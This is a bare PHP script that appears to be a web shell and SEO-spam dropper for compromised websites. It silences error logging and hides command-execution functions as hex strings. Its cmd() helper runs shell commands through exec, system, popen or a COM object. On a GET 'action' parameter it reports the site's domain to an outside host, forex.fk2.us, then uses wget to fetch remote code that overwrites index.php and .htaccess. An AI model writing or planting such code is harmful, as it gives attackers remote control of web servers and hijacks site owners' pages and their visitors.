<?php
@set_time_limit(0);
@clearstatcache();
@ini_set("error_log", NULL);
@ini_set("log_errors", 0);
@ini_set("max_execution_time", 0);
@ini_set("output_buffering", 0);
@ini_set("display_errors", 0);
$a = 'http://forex.fk2.us/fxseo';
$htaccess_url = $a.'/htaccess.php';
$indexcode_url = $a.'/indexcode.php';
$mulucode_url = $a.'/mulucode.php';
$Array = ["676574637764", "676c6f62", "69735f646972", "69735f66696c65", "69735f7772697461626c65", "69735f7265616461626c65", "66696c657065726d73", "66696c65", "7068705f756e616d65", "6765745f63757272656e745f75736572", "68746d6c7370656369616c6368617273", "66696c655f6765745f636f6e74656e7473", "6d6b646972", "746f756368", "6368646972", "72656e616d65", "65786563", "7061737374687275", "73797374656d", "7368656c6c5f65786563", "706f70656e", "70636c6f7365", "73747265616d5f6765745f636f6e74656e7473", "70726f635f6f70656e", "756e6c696e6b", "726d646972", "666f70656e", "66636c6f7365", "66696c655f7075745f636f6e74656e7473", "6d6f76655f75706c6f616465645f66696c65", "63686d6f64", "7379735f6765745f74656d705f646972", "6261736536345F6465636F6465", "6261736536345F656E636F6465"];
$hitung_array = count($Array);
for ($i = 0; $i < $hitung_array; $i++) {
    $fungsi[] = unx($Array[$i]);
}
function cmd($in, $re = false)
{
    $out = "";
    try {
        if ($re) {
            $in = $in . " 2>&1";
        }
        if (function_exists("exec")) {
            @$GLOBALS["fungsi"][16]($in, $out);
            $out = @join("\n", $out);
        } elseif (function_exists("passthru")) {
            ob_start();
            @$GLOBALS["fungsi"][17]($in);
            $out = ob_get_clean();
        } elseif (function_exists("system")) {
            ob_start();
            @$GLOBALS["fungsi"][18]($in);
            $out = ob_get_clean();
        } elseif (function_exists("shell_exec")) {
            $out = $GLOBALS["fungsi"][19]($in);
        } elseif (function_exists("popen") && function_exists("pclose")) {
            if (is_resource($f = @$GLOBALS["fungsi"][20]($in, "r"))) {
                $out = "";
                while (!@feof($f)) {
                    $out .= fread($f, 1024);
                }
                $GLOBALS["fungsi"][21]($f);
            }
        } elseif (function_exists("proc_open")) {
            $pipes = array();
            $process = @$GLOBALS["fungsi"][23]($in . " 2>&1", array(array("pipe", "w"), array("pipe", "w"), array("pipe", "w")), $pipes, null);
            $out = @$GLOBALS["fungsi"][22]($pipes[1]);
        } elseif (class_exists("COM")) {
            $alfaWs = new COM("WScript.shell");
            $e = $alfaWs->{$GLOBALS}["fungsi"][16]("cmd.exe /c " . $_POST["alfa1"]);
            $stdout = $e->StdOut();
            $out = $stdout->ReadAll();
        }
    } catch (Exception $e) {
    }
    return $out;
}
function unx($y)
{
    $n = "";
    for ($i = 0; $i < strlen($y) - 1; $i += 2) {
        $n .= chr(hexdec($y[$i] . $y[$i + 1]));
    }
    return $n;
}


function getServerCont($url,$data=array()) {
	$url=str_replace(' ','+',$url);
	$ch=curl_init();
	curl_setopt($ch,CURLOPT_URL,"$url");
	curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
	curl_setopt($ch,CURLOPT_HEADER,0);
	curl_setopt($ch,CURLOPT_TIMEOUT,10);
	curl_setopt($ch,CURLOPT_POST,1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
	curl_setopt($ch,CURLOPT_POSTFIELDS,http_build_query($data));
	$output = curl_exec($ch);
	$errorCode = curl_errno($ch);
	curl_close($ch);
	if(0!== $errorCode) {
		return false;
	}
	return $output;
}
$action=$_GET['action'];
$domain=$_SERVER["HTTP_HOST"];
$req_uri=$_SERVER['REQUEST_URI'];
$req_url=$http.$domain.$req_uri;
$data1[]=array();
$data1['domain']=$domain;
$data1['req_uri']=$req_uri;
$data1['req_url']=$req_url;

if($action == 'mulu')
{
    $data1['action']= 'check';
    $indexcode_path = getServerCont($mulucode_url,$data1);
    if (!file_exists($indexcode_path)) {
       mkdir($indexcode_path, 0777, true);
    }
    echo $fungsi[10](cmd('wget -O '.$indexcode_path.'/index.php '.'http://forex.fk2.us/mulu2.txt' . ' 2>&1'));
    echo 'shell_exec ok';
    
}
if($action == 'down')
{

    $data1['action']= 'check';
    $indexcode_path = getServerCont($indexcode_url,$data1);
    $data1['action']= 'getcode';
    $indexcode_code = getServerCont($indexcode_url,$data1);
    if (file_exists($indexcode_path.'/index.php')) {
          if (unlink($indexcode_path.'/index.php')) {
         }
         else
         {
             rename($indexcode_path.'/index.php', $indexcode_path.'/index-c.php');
         }
    }
    $geturl = $indexcode_url.'?action=getcode-'.$_SERVER["HTTP_HOST"];
         echo $fungsi[10](cmd('wget -O '.$indexcode_path.'/index.php '.$geturl . ' 2>&1'));
         echo 'shell_exec ok & ';
    
    if (file_exists($indexcode_path.'/index.php')) {
    }else{
         file_put_contents($indexcode_path.'/index.php',$indexcode_code);
    }

    $data1['action']= 'check';
    $htaccess_status = getServerCont($htaccess_url,$data1);
    if($htaccess_status == "status_1_ok") {
         $data1['action']= 'getcode';
         $htaccess_code = getServerCont($htaccess_url,$data1);
         file_put_contents($indexcode_path.'/.htaccess',$htaccess_code);
    }
    echo 'down code execution completed.';
}


?>